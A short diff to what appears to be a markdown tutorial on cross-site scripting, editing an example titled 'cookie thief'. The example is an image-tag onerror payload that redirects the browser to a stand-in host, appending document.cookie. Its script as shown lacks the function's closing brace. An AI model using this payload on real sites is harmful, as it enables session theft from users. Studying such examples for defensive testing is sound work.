@@ -67,7 +67,8 @@ From all the website submits, test with HTML chars (html entities), and look the
 ## Examples     
 ### Example 1 : cookie thief 
 ```
-    <img src="notExist" onerror="myFunction()"/>
+    <img src="notExistImg" onerror="myFunction()"/>
     <script>function myFunction(){
 	window.location = "http://myServer/?cookie".concat("=", document.cookie);
     </script>
+```
